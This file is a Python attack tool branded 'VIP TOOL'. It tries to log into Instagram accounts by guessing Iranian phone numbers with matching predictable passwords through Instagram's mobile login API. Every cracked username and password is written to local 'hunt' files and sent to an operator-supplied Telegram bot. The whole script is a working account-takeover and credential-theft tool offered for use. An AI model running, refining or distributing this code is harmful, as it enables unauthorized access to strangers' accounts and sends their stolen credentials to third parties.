import requests,sys,time,os,random,pyfiglet,colorama,secrets,uuid,whisper
from secrets import token_hex
from time import sleep
from uuid import uuid4
uid = uuid.uuid4()
cookie = secrets.token_hex(8) * 2
h = 0
b = 0
s = 0
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
banner = pyfiglet.figlet_format(' - VIP TOOL ')
print(banner+f"{S}< /DABIO/ >\n______________________________________")
ID=input('[+] ID     : ')
tok=input('[+] TOKEN       : ')
print(f"{S}______________________________________")
user = '0987654321'
while True:
    whisper = str("".join(random.choice(user)for i in range(7)))
    username= '+98912'+whisper
    password = '0912'+whisper
    if username =='':#
        exit()
    if password =='':
        exit()
    cookies = token_hex(8) * 2
    url='https://i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
    data = {'uuid':uid,  'password':password,
              'username':username,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
    req= requests.post(url, headers=headers, data=data)
#    print(req.json())
    if 'logged_in_user' in req.json():
        with open('HUNT.txt', 'a') as (HACKED):
          HACKED.write(f'- New Hunt  > Instagram\n ︎︎ ––––––––––––––––︎ ꨄ︎. \n UeSr ==> {username} \n PaSsWoRd ==> {password}\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎ ︎.')
          h+=1
          os.system('cls' if os.name == 'nt' else 'clear')
          print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n",end='')
          tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= - New Hunt  > Instagram\n ︎︎ ––––––––––––––––︎ ꨄ︎. \n UeSr ==> {username} \n PaSsWoRd ==> {password}\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎."
        i = requests.post(tlg)
    if '"message":"challenge_required"' in req.text:
        with open('Secure.txt', 'a') as (SECURE):
            SECURE.write(' [👤] 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : {} \n [🔒] 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 : {} \n\n'.format(username, password))
            s+=1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n",end='')
    if "'message': 'Please wait a few minutes before you try again.'" in req.json():

            b += 0
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n",end='')
    else:
            b+=1
            os.system('cls' if os.name == 'nt' else 'clear')    
            print(f"{banner}\r                           \n [=] Hit : {h} \n [=] Bad : {b} \n [=] Scure : {s} \n [=] User : {username}\n [=] Pass : {password} ",end='')
